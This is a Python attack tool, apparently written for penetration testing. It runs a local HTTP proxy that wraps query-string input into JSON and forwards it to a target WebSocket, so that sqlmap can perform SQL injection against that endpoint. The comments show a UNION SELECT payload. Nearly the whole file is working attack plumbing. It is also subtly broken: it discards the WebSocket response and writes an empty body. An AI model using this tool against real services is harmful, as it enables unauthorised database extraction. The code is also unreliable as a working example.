from http.server import HTTPServer, BaseHTTPRequestHandler
from websocket import create_connection
from urllib.parse import unquote, urlparse
from argparse import RawTextHelpFormatter
import argparse


class Send_Websocket():	

	def enviar_ws(payload):
		servidor_ws = args.Websocket
		connection_ws = create_connection(servidor_ws)

		message = unquote(payload).replace('"','\'')
		data = "{\"id\":\""+message+"\"}" # payload para enviar ao websocket com a injeção sql

		connection_ws.send(data)
		resp = connection_ws.recv()
		connection_ws.close()

		if resp:
			return resp
		else:
			return ''

class HTTP(BaseHTTPRequestHandler):

	def do_GET(self):
		self.send_response(200)
		try:
			payload = urlparse(self.path).query.split('=',1)[1] # /?id=123
			
		except IndexError:
			payload = False
				
		if payload:
			content = Send_Websocket.enviar_ws(payload) # 123' UNION SELECT......
		else:
			content = 'Nenhum parâmetro especificado'

		self.send_header("Content-type","text/plain")
		self.end_headers()
		self.wfile.write(bytes())
		return

parser = argparse.ArgumentParser(usage="python3 WebSocket_SQLI.py --ws \"ws://teste:9000/\" --lhost 127.0.0.1 --lport 6060 ",formatter_class=RawTextHelpFormatter)

parser.add_argument("--ws","-W",dest="Websocket",action="store",type=str,required=False,help="Insert the websocket for the test")
parser.add_argument("--lhost",dest="host",action="store",type=str,required=True,default="127.0.0.1",help="Enter your ip. Default=127.0.0.1")
parser.add_argument("--lport",dest="port",action="store",type=int,required=True,default="80",help="Enter your port. Default=80")
args = parser.parse_args()

if __name__ == "__main__":
	server = HTTPServer((args.host,args.port),HTTP)
	print("Use esse comando em outro terminal para realização da injeção com sqlmap: sqlmap -u \"http://ip:port/?id=123\" -p id .....")
	server.serve_forever()
